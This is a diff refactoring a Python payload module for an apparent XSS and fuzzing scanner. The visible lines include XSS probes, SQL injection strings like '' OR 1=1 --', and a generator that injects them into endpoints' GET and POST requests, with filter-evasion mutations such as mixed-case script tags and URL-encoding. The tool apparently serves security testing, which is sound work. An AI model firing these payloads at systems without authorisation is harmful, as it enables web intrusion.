@@ -1,12 +1,18 @@
 # xss_security_gui/auto_recon/payloads.py
 
+"""
+Расширенные базы XSS и fuzz payloads + генератор для AutoRecon.
+"""
+
 from random import choice, randint
+from typing import List, Dict, Any
 
 
-# ---------------------------------------------------------
-# Расширенная база XSS payloads
-# ---------------------------------------------------------
-XSS_PAYLOADS = [
+# ============================================================
+#  База XSS payloads
+# ============================================================
+
+XSS_PAYLOADS: List[str] = [
     # Базовые
     "<script>alert('XSS')</script>",
     "\"><svg/onload=alert(1)>",
@@ -44,10 +50,11 @@ XSS_PAYLOADS = [
 ]
 
 
-# ---------------------------------------------------------
-# Расширенная база fuzz payloads
-# ---------------------------------------------------------
-FUZZ_PAYLOADS = [
+# ============================================================
+#  База fuzz payloads
+# ============================================================
+
+FUZZ_PAYLOADS: List[str] = [
     # SQLi
     "' OR 1=1 --",
     "\" OR \"\"=\"",
@@ -114,29 +121,45 @@ FUZZ_PAYLOADS = [
 ]
 
 
-# ---------------------------------------------------------
-# Публичные API-функции
-# ---------------------------------------------------------
-def generate_xss_payloads() -> list:
-    """Возвращает расширенный набор XSS payloads."""
+# ============================================================
+#  Публичные API-функции
+# ============================================================
+
+def generate_xss_payloads() -> List[str]:
+    """Возвращает копию расширенного набора XSS payloads."""
     return XSS_PAYLOADS.copy()
 
 
-def generate_fuzz_payloads() -> list:
-    """Возвращает расширенный набор fuzz payloads."""
+def generate_fuzz_payloads() -> List[str]:
+    """Возвращает копию расширенного набора fuzz payloads."""
     return FUZZ_PAYLOADS.copy()
 
 
-# ---------------------------------------------------------
-# Генератор payloads для AutoRecon
-# ---------------------------------------------------------
-class PayloadGenerator:
-    def __init__(self, endpoints, use_mutation=True, preset=None):
-        self.endpoints = endpoints
-        self.preset = preset or choice(XSS_PAYLOADS)
-        self.use_mutation = use_mutation
+# ============================================================
+#  Генератор payloads для AutoRecon
+# ============================================================
 
-    def generate(self):
+class PayloadGenerator:
+    """
+    Генератор payload'ов для AutoRecon:
+    • выбирает preset
+    • мутирует payload при необходимости
+    • создаёт GET/POST запросы для всех эндпоинтов
+    """
+
+    def __init__(
+        self,
+        endpoints: List[Dict[str, Any]],
+        use_mutation: bool = True,
+        preset: str | None = None,
+    ):
+        self.endpoints = endpoints
+        self.use_mutation = use_mutation
+        self.preset = preset or choice(XSS_PAYLOADS)
+
+    # --------------------------------------------------------
+
+    def generate(self) -> List[Dict[str, Any]]:
         """Генерирует GET/POST payloads для всех endpoints."""
         results = []
 
@@ -155,7 +178,7 @@ class PayloadGenerator:
                 results.append({
                     "method": "GET",
                     "url": f"{ep['url']}?{query}",
-                    "source": ep.get("source", "unknown")
+                    "source": ep.get("source", "unknown"),
                 })
 
             elif method == "POST":
@@ -164,22 +187,37 @@ class PayloadGenerator:
                     "method": "POST",
                     "url": ep["url"],
                     "json": body,
-                    "source": ep.get("source", "unknown")
+                    "source": ep.get("source", "unknown"),
                 })
 
         return results
 
-    def mutate_payload(self, base):
+    # --------------------------------------------------------
+
+    def mutate_payload(self, base: str) -> str:
         """Создаёт случайную мутацию XSS payload."""
         variants = [
             base.replace("<", "%3C").replace(">", "%3E"),
             base.replace("alert", "confirm"),
             base.replace("script", "sCrIpT"),
-            base + f"<!--{randint(100,999)}-->",
+            base + f"<!--{randint(100, 999)}-->",
             base.replace("1", str(randint(2, 9))),
-            base.replace("XSS", f"X{randint(100,999)}"),
+            base.replace("XSS", f"X{randint(100, 999)}"),
             base.replace("document.cookie", "document.domain"),
             base.replace("document.cookie", "navigator.userAgent"),
             base.replace("document.cookie", "window.location.href"),
         ]
         return choice(variants)
+
+
+# ============================================================
+#  Публичный API модуля
+# ============================================================
+
+__all__ = [
+    "XSS_PAYLOADS",
+    "FUZZ_PAYLOADS",
+    "generate_xss_payloads",
+    "generate_fuzz_payloads",
+    "PayloadGenerator",
+]
